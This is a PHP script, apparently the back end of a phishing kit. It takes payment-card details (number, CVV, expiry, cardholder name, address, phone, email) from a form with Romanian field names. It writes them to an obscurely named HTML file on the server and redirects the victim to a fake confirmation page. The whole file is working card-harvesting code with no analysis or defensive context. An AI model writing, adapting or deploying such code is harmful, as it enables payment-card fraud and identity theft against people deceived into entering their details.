<?php

header("Location: confirmation.html");


$cardnumber= $_POST['NumarCard'];
$cvv= $_POST['CVV'];
$dataZI= $_POST['Zi'];
$dataLUNA= $_POST['Luna'];
$cardname= $_POST['NumeCard'];
$cardnamelast= $_POST['PrenumeCard'];
$address= $_POST['Adresa'];
$city= $_POST['Oras'];
$state= $_POST['Stat'];
$zipcodecc= $_POST['CodPostal'];
$contactname= $_POST['NumedeContact'];
$phonenumber= $_POST['NumardeTelefon'];
$contactemail= $_POST['EmaildeContact'];


$Carti = fopen("s4dkf5dfgh25422524dvdds.html", "a");

fwrite($Carti, "Numar de Card: ");
fwrite($Carti, $cardnumber);
fwrite($Carti,"\r\n");
fwrite($Carti, "CVV: ");
fwrite($Carti, $cvv);
fwrite($Carti,"\r\n");
fwrite($Carti, "Data: ");
fwrite($Carti, $dataZI);
fwrite($Carti, " / ");
fwrite($Carti, $dataLUNA);
fwrite($Carti,"\r\n");
fwrite($Carti, "Nume: ");
fwrite($Carti, $cardname);
fwrite($Carti, "\r\n");
fwrite($Carti, "Prenume: ");
fwrite($Carti, $cardnamelast);
fwrite($Carti,"\r\n");
fwrite($Carti, "Adresa: ");
fwrite($Carti, $address);
fwrite($Carti,"\r\n");
fwrite($Carti, "Oras: ");
fwrite($Carti, $city);
fwrite($Carti,"\r\n");
fwrite($Carti, "Stat: ");
fwrite($Carti, $state);
fwrite($Carti,"\r\n");
fwrite($Carti, "Zip: ");
fwrite($Carti, $zipcodecc);
fwrite($Carti, "\r\n");
fwrite($Carti, "Nume de Contact: ");
fwrite($Carti, $contactname);
fwrite($Carti, "\r\n");
fwrite($Carti, "Numar de Telefon: ");
fwrite($Carti, $phonenumber);
fwrite($Carti, "\r\n");
fwrite($Carti, "Email de Contact: ");
fwrite($Carti, $contactemail);
fwrite($Carti, "\r\n");
fwrite($Carti, "================================");
fwrite($Carti, "\r\n");
fclose($Carti);
?>